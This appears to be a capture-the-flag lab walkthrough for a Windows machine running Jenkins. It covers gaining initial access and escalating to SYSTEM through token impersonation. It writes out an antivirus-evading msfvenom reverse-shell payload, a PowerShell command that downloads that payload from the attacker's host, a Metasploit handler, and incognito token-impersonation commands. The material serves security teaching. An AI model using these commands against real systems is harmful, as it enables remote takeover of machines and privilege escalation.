* Initial Access

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using [[https://github.com/samratashok/nishang][Nishang]] to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1][Reverse shell scripts]]

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

* Switching Shells


To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

#+begin_src bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
#+end_src

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

#+begin_src bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
#+end_src
Before running this program, ensure the handler is set up in metasploit:


#+begin_src bash
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
#+end_src

ï»¿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell

#+begin_src bash
Start-Process "shell-name.exe"
#+end_src

This should spawn a meterpreter shell for you!

* Privilege Escalation


Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

   - user SIDs(security identifier)
   - group SIDs
   - privileges

amongst other things. More detailed information can be found [[https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens][here]].

There are two types of access tokens:

   - primary access tokens: those associated with a user account that are generated on log on
   - impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

   - SecurityAnonymous: current user/client cannot impersonate another user/client
   - SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
   - SecurityImpersonation: current user/client can impersonate the client's security context on the local system
   - SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

   - SeImpersonatePrivilege
   - SeAssignPrimaryPrivilege
   - SeTcbPrivilege
   - SeBackupPrivilege
   - SeRestorePrivilege
   - SeCreateTokenPrivilege
   - SeLoadDriverPrivilege
   - SeTakeOwnershipPrivilege
   - SeDebugPrivilege


View all the privileges using whoami /priv

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.

To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
